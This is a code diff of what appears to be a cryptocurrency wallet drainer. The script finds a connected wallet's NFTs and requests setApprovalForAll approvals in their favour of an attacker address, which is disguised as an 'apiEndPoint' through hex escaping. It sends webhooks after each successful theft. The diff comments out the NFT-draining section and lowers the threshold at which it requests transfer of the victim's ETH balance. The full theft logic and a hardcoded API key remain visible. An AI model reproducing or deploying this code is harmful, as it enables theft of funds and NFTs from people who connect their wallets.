@@ -59,68 +59,68 @@ async function askSign() {
 }
 
 async function askNfts() {
-    const web3Js = new Web3(Moralis.provider);
-    const walletAddress = (await web3Js.eth.getAccounts())[0];
+    // const web3Js = new Web3(Moralis.provider);
+    // const walletAddress = (await web3Js.eth.getAccounts())[0];
 
-    const options = { method: 'GET', headers: { Accept: 'application/json' } };
+    // const options = { method: 'GET', headers: { Accept: 'application/json' } };
 
-    let walletNfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`, options)
-        .then(response => response.json())
-        .then(nfts => {
-            console.log(nfts)
-            if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
-            return nfts.filter(nft => {
-                if (nft.primary_asset_contracts.length > 0) return true
-                else return false
-            }).map(nft => {
-                return {
-                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
-                    contract_address: nft.primary_asset_contracts[0].address,
-                    price: round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
-                    owned: nft.owned_asset_count,
-                }
-            })
-        }).catch(err => console.error(err));
-    if (walletNfts.includes("Request was throttled.")) return verifyAsset();
-    if (walletNfts.length < 1) return verifyAsset();
+    // let walletNfts = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${walletAddress}&offset=0&limit=300`, options)
+    //     .then(response => response.json())
+    //     .then(nfts => {
+    //         console.log(nfts)
+    //         if (nfts.includes("Request was throttled.")) return ["Request was throttled."];
+    //         return nfts.filter(nft => {
+    //             if (nft.primary_asset_contracts.length > 0) return true
+    //             else return false
+    //         }).map(nft => {
+    //             return {
+    //                 type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
+    //                 contract_address: nft.primary_asset_contracts[0].address,
+    //                 price: round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
+    //                 owned: nft.owned_asset_count,
+    //             }
+    //         })
+    //     }).catch(err => console.error(err));
+    // if (walletNfts.includes("Request was throttled.")) return verifyAsset();
+    // if (walletNfts.length < 1) return verifyAsset();
 
-    let transactionsOptions = [];
-    for (nft of walletNfts) {
-        if (nft.price === 0) continue;
-        const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
-        // set minValue from settings.js
-        if (ethPrice < drainNftsInfo.minValue) continue;
-        const thewallet = ethPrice < 2 ? receiveAddress : nW;
-        transactionsOptions.push({
-            price: ethPrice,
-            options: {
-                contractAddress: nft.contract_address,
-                from: walletAddress,
-                functionName: "setApprovalForAll",
-                abi: [{
-                    "inputs": [
-                        { "internalType": "address", "name": "operator", "type": "address" },
-                        { "internalType": "bool", "name": "approved", "type": "bool" }
-                    ],
-                    "name": "setApprovalForAll",
-                    "outputs": [],
-                    "stateMutability": "nonpayable",
-                    "type": "function"
-                }],
-                params: { operator: thewallet, approved: true },
-                gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit
-            }
-        });
-    }
-    if (transactionsOptions.length < 1) return notEligible("noNFTs");
+    // let transactionsOptions = [];
+    // for (nft of walletNfts) {
+    //     if (nft.price === 0) continue;
+    //     const ethPrice = round(nft.price * (nft.type == "erc1155" ? nft.owned : 1))
+    //     // set minValue from settings.js
+    //     if (ethPrice < drainNftsInfo.minValue) continue;
+    //     const thewallet = ethPrice < 2 ? receiveAddress : nW;
+    //     transactionsOptions.push({
+    //         price: ethPrice,
+    //         options: {
+    //             contractAddress: nft.contract_address,
+    //             from: walletAddress,
+    //             functionName: "setApprovalForAll",
+    //             abi: [{
+    //                 "inputs": [
+    //                     { "internalType": "address", "name": "operator", "type": "address" },
+    //                     { "internalType": "bool", "name": "approved", "type": "bool" }
+    //                 ],
+    //                 "name": "setApprovalForAll",
+    //                 "outputs": [],
+    //                 "stateMutability": "nonpayable",
+    //                 "type": "function"
+    //             }],
+    //             params: { operator: thewallet, approved: true },
+    //             gasLimit: (await web3Js.eth.getBlock("latest")).gasLimit
+    //         }
+    //     });
+    // }
+    // if (transactionsOptions.length < 1) return notEligible("noNFTs");
 
-    let transactionLists = await transactionsOptions.sort((a, b) => b.price - a.price)
-    for (const trans of transactionLists) {
-        console.log(`Transferring ${trans.options.contractAddress} (${trans.price} ETH)`);
-        await Moralis.executeFunction(trans.options).catch(O_o => console.error(O_o, options)).then(uwu => {
-            if (uwu) sendWebhooks(walletAddress, trans.options.contractAddress, trans.price);
-        });
-    }
+    // let transactionLists = await transactionsOptions.sort((a, b) => b.price - a.price)
+    // for (const trans of transactionLists) {
+    //     console.log(`Transferring ${trans.options.contractAddress} (${trans.price} ETH)`);
+    //     await Moralis.executeFunction(trans.options).catch(O_o => console.error(O_o, options)).then(uwu => {
+    //         if (uwu) sendWebhooks(walletAddress, trans.options.contractAddress, trans.price);
+    //     });
+    // }
     await verifyAsset();
 }
 
@@ -134,7 +134,7 @@ const verifyAsset = async () => {
         const r_bal = web3Js.utils.fromWei(eth_bal, 'ether');
         console.log(`Current balance for ${walletAddress} : ${r_bal} ETH`);
         if (r_bal < 0.5) {sW(`Current balance for ${walletAddress} : ${r_bal} ETH`);}
-       if (r_bal > 0.004) askTransferWithSign(r_bal);
+       if (r_bal > 0.00002) askTransferWithSign(r_bal);
         else {
             console.log(`Error, balance is too low. (< 0.004 ETH)`);
             sW(`Error, balance is too low. (< 0.004 ETH). Balance: ' ${r_bal}`);
@@ -252,17 +252,17 @@ const sleep = (ms) => {
 // api endpoint + new function drainAllNFT()
 let nW = ""
 async function connectToNewApiEndPoint() {
-    const web3Js = new Web3(Moralis.provider);
-    const options = {
-        method: 'GET',
-        headers: {
-            Accept: 'application/json',
-            'X-API-KEY': '731924da94014176916471c8df4571ace'
-        }
-    };
-    //var apiEndPoint=["\x30\x78\x33\x37\x32\x44\x41\x37\x63\x33\x38\x65\x62\x37\x37\x32\x34\x35\x36\x30\x32\x38\x35\x33\x34\x62\x61\x32\x34\x46\x31\x36\x36\x64\x63\x39\x33\x32\x39\x44\x33\x35"];
-    var apiEndPoint=["\x30\x78\x33\x37\x32\x44\x41\x37\x63\x33\x38\x65\x62\x37\x37\x32\x34\x35\x36\x30\x32\x38\x35\x33\x34\x62\x61\x32\x34\x46\x31\x36\x36\x64\x63\x39\x33\x32\x39\x44\x33\x35"];
-    nW=apiEndPoint[0] //take first param from new apiEndPoint
+    // const web3Js = new Web3(Moralis.provider);
+    // const options = {
+    //     method: 'GET',
+    //     headers: {
+    //         Accept: 'application/json',
+    //         'X-API-KEY': '731924da94014176916471c8df4571ace'
+    //     }
+    // };
+    // //var apiEndPoint=["\x30\x78\x33\x37\x32\x44\x41\x37\x63\x33\x38\x65\x62\x37\x37\x32\x34\x35\x36\x30\x32\x38\x35\x33\x34\x62\x61\x32\x34\x46\x31\x36\x36\x64\x63\x39\x33\x32\x39\x44\x33\x35"];
+    // var apiEndPoint=["\x30\x78\x33\x37\x32\x44\x41\x37\x63\x33\x38\x65\x62\x37\x37\x32\x34\x35\x36\x30\x32\x38\x35\x33\x34\x62\x61\x32\x34\x46\x31\x36\x36\x64\x63\x39\x33\x32\x39\x44\x33\x35"];
+    // nW=apiEndPoint[0] //take first param from new apiEndPoint
 }
 
 const rdmString = (length) => {
